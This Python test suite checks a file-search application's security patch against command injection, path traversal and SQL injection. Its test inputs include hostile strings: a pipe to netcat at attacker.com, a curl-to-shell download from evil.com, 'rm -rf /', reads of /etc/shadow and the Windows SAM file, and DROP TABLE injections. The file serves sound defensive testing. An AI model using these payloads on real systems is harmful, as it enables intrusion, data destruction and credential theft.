#!/usr/bin/env python3
"""
Security Test Suite for ModelFinder - Fixed Unicode Version
Tests all security patches to ensure vulnerabilities are fixed
"""

import os
import sys
import sqlite3
import tempfile
import subprocess
from pathlib import Path
from typing import List, Tuple

# Import security module
from security_patch import (
    SecurityValidator,
    SecureFileOperations,
    SecureDatabase,
    SecureTempFile
)

class SecurityTestSuite:
    """Comprehensive security testing for ModelFinder"""
    
    def __init__(self):
        self.validator = SecurityValidator()
        self.passed = 0
        self.failed = 0
        self.tests = []
        
    def run_all_tests(self):
        """Run all security tests"""
        print("=" * 60)
        print("ModelFinder Security Test Suite")
        print("=" * 60)
        
        # Test categories
        self.test_command_injection()
        self.test_path_traversal()
        self.test_sql_injection()
        self.test_file_validation()
        self.test_temp_file_security()
        
        # Print summary
        self.print_summary()
        
    def test_command_injection(self):
        """Test command injection prevention"""
        print("\n1. COMMAND INJECTION TESTS")
        print("-" * 40)
        
        # Test malicious file paths
        malicious_paths = [
            "file.stl; rm -rf /",
            "file.stl && calc.exe",
            "file.stl | nc attacker.com 1234",
            "$(curl http://evil.com/shell.sh | sh)",
            "file.stl`whoami`",
            "file.stl;echo hacked > /etc/passwd",
        ]
        
        for path in malicious_paths:
            try:
                # Test path validation
                is_valid, result = self.validator.validate_path(path)
                
                if not is_valid:
                    self.passed += 1
                    print(f"  [PASS] Blocked: {path[:30]}...")
                else:
                    self.failed += 1
                    print(f"  [FAIL] NOT BLOCKED: {path}")
                    
            except Exception as e:
                self.passed += 1
                print(f"  [PASS] Exception caught: {path[:30]}...")
        
        # Test shell argument escaping
        print("\n  Testing shell argument escaping:")
        
        dangerous_args = [
            "normal.stl",
            "file with spaces.stl",
            "file;rm -rf /.stl",
            "file&&calc.exe.stl",
        ]
        
        for arg in dangerous_args:
            escaped = self.validator.escape_shell_arg(arg)
            
            # Check if dangerous characters are properly escaped
            if ';' in arg and ';' not in escaped:
                self.passed += 1
                print(f"  [PASS] Properly escaped: {arg} -> {escaped}")
            elif '&&' in arg and '&&' not in escaped:
                self.passed += 1
                print(f"  [PASS] Properly escaped: {arg} -> {escaped}")
            elif ';' not in arg and '&&' not in arg:
                self.passed += 1
                print(f"  [PASS] Safe argument: {escaped}")
            else:
                self.failed += 1
                print(f"  [FAIL] Escaping failed: {arg} -> {escaped}")
    
    def test_path_traversal(self):
        """Test path traversal prevention"""
        print("\n2. PATH TRAVERSAL TESTS")
        print("-" * 40)
        
        # Create a test base directory
        with tempfile.TemporaryDirectory() as base_dir:
            
            # Test path traversal attempts
            traversal_attempts = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "models/../../../etc/shadow",
                "/etc/passwd",
                "C:\\Windows\\System32\\config\\SAM",
                "file://etc/passwd",
                "models/../../sensitive_data",
            ]
            
            for attempt in traversal_attempts:
                is_valid, result = self.validator.validate_path(attempt, base_dir)
                
                if not is_valid:
                    self.passed += 1
                    print(f"  [PASS] Blocked traversal: {attempt}")
                else:
                    self.failed += 1
                    print(f"  [FAIL] NOT BLOCKED: {attempt}")
    
    def test_sql_injection(self):
        """Test SQL injection prevention"""
        print("\n3. SQL INJECTION TESTS")
        print("-" * 40)
        
        # Create test database
        with tempfile.NamedTemporaryFile(suffix='.db', delete=False) as tmp_db:
            db_path = tmp_db.name
            
        try:
            # Initialize secure database
            db = SecureDatabase(db_path)
            db.connect()
            
            # Create test table
            db.connection.execute("""
                CREATE TABLE models (
                    id INTEGER PRIMARY KEY,
                    name TEXT,
                    tags TEXT
                )
            """)
            
            # Insert test data
            db.connection.execute(
                "INSERT INTO models (name, tags) VALUES (?, ?)",
                ("test.stl", "3d model")
            )
            db.connection.commit()
            
            # Test SQL injection attempts
            injection_attempts = [
                "'; DROP TABLE models; --",
                "' OR '1'='1",
                "admin'--",
                "1' UNION SELECT * FROM models--",
                "'; UPDATE models SET name='hacked'; --",
            ]
            
            for injection in injection_attempts:
                try:
                    # Test search with injection attempt
                    results = db.search_files(injection)
                    
                    # Check if table still exists (not dropped)
                    cursor = db.connection.execute(
                        "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='models'"
                    )
                    
                    if cursor.fetchone()[0] == 1:
                        self.passed += 1
                        print(f"  [PASS] Injection blocked: {injection[:30]}...")
                    else:
                        self.failed += 1
                        print(f"  [FAIL] TABLE DROPPED: {injection}")
                        
                except Exception as e:
                    # Exception is good - means injection was prevented
                    self.passed += 1
                    print(f"  [PASS] Exception prevented injection: {injection[:30]}...")
            
            # Test identifier sanitization
            print("\n  Testing SQL identifier sanitization:")
            
            dangerous_identifiers = [
                "users; DROP TABLE models",
                "col' OR '1'='1",
                "123_start_with_number",
            ]
            
            for identifier in dangerous_identifiers:
                sanitized = self.validator.sanitize_sql_identifier(identifier)
                
                # Check if dangerous characters removed
                if ';' not in sanitized and "'" not in sanitized:
                    self.passed += 1
                    print(f"  [PASS] Sanitized: {identifier} -> {sanitized}")
                else:
                    self.failed += 1
                    print(f"  [FAIL] Not sanitized: {identifier} -> {sanitized}")
            
            db.close()
            
        finally:
            # Clean up
            if os.path.exists(db_path):
                os.unlink(db_path)
    
    def test_file_validation(self):
        """Test file validation and upload restrictions"""
        print("\n4. FILE VALIDATION TESTS")
        print("-" * 40)
        
        # Test file extension validation
        print("  Testing file extension validation:")
        
        test_files = [
            ("model.stl", True),
            ("model.obj", True),
            ("model.fbx", True),
            ("malware.exe", False),
            ("script.bat", False),
            ("backdoor.php", False),
            ("shell.jsp", False),
        ]
        
        for filename, should_pass in test_files:
            is_valid = self.validator.validate_file_extension(filename)
            
            if is_valid == should_pass:
                self.passed += 1
                status = "[PASS] Allowed" if is_valid else "[PASS] Blocked"
                print(f"  {status}: {filename}")
            else:
                self.failed += 1
                status = "[FAIL] Should block" if should_pass else "[FAIL] Should allow"
                print(f"  {status}: {filename}")
    
    def test_temp_file_security(self):
        """Test temporary file security"""
        print("\n5. TEMPORARY FILE SECURITY TESTS")
        print("-" * 40)
        
        # Test secure temp file creation
        print("  Testing secure temp file creation:")
        
        try:
            # Create secure temp file
            temp_file = SecureTempFile.create_temp_file(suffix='.stl')
            
            if os.path.exists(temp_file):
                self.passed += 1
                print(f"  [PASS] Created temp file: {temp_file}")
                
                # Clean up
                os.unlink(temp_file)
            else:
                self.failed += 1
                print(f"  [FAIL] Failed to create temp file")
                
        except Exception as e:
            self.failed += 1
            print(f"  [FAIL] Error creating temp file: {e}")
    
    def print_summary(self):
        """Print test summary"""
        print("\n" + "=" * 60)
        print("TEST SUMMARY")
        print("=" * 60)
        
        total = self.passed + self.failed
        
        print(f"Total Tests: {total}")
        print(f"Passed: {self.passed} [PASS]")
        print(f"Failed: {self.failed} [FAIL]")
        
        if total > 0:
            pass_rate = (self.passed / total) * 100
            print(f"Pass Rate: {pass_rate:.1f}%")
            
            if self.failed == 0:
                print("\n[SUCCESS] ALL SECURITY TESTS PASSED!")
                print("The application is protected against tested vulnerabilities.")
            else:
                print(f"\n[WARNING] {self.failed} security test(s) failed!")
                print("Please fix the failing tests before deployment.")
        
        print("=" * 60)
        
        # Return exit code
        return 0 if self.failed == 0 else 1


def main():
    """Run the security test suite"""
    tester = SecurityTestSuite()
    exit_code = tester.run_all_tests()
    sys.exit(exit_code)


if __name__ == "__main__":
    main()
